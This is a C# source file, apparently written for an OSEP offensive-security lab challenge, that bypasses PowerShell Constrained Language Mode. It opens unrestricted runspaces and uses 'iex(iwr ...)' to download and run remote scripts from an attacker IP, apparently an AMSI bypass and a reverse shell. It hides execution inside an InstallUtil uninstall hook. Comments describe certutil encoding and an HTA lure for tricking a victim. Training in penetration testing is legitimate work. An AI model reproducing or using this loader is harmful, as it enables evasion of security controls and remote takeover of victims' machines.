using System;
using System.Collections.ObjectModel;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;

// This file is used to solve challenge 4 in OSEP, we copmpile it, then encode it with: certutil -encode bypass_clm.exe file.txt
// We move file.txt to our attacking machine and host it, we also have the HTA template in this folder to use to trick the victim download the file, decodes it back to EXE, and run our code.

namespace PsBypassCostraintLanguageMode
{
    public class Program
    {
        public static void Main()
        {


            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
            runSpaceInvoker.Invoke("iex(iwr http://192.168.45.173/amsi.txt -UseBasicParsing)");


            Runspace runspace2 = RunspaceFactory.CreateRunspace();
            runspace2.Open();
            RunspaceInvoke runSpaceInvoker2 = new RunspaceInvoke(runspace2);
            runSpaceInvoker.Invoke("iex(iwr http://192.168.45.173/rev.txt -UseBasicParsing)");

        }
    }

        [System.ComponentModel.RunInstaller(true)]
        public class Loader : System.Configuration.Install.Installer
        {

            public override void Uninstall(System.Collections.IDictionary savedState)
            {
                base.Uninstall(savedState);

            Program.Main();
            }
        }

    }

